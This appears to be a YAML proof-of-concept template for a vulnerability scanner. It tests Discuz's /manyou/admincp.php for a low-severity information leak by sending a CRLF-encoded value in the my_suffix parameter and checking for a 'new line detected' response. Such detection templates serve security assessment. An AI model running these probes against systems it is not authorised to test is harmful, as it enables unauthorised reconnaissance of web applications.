name: poc-yaml-discuz-admincp-info-leak
binding: 7dd58a7f-0798-4a89-bb46-c55167a2602a
manual: true
detail:
    links:
        - https://blog.51cto.com/linkboy/291613
    vulnerability:
        id: CT-157849
        level: low
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /manyou/admincp.php?my_suffix=xxx
        expression: response.status == 200 && !response.body.bcontains(b"new line detected")
    r1:
        request:
            cache: true
            method: GET
            path: /manyou/admincp.php?my_suffix=%0A%0Dxxx
        expression: response.status == 200 && response.body.bcontains(b"new line detected")
expression: r0() && r1()
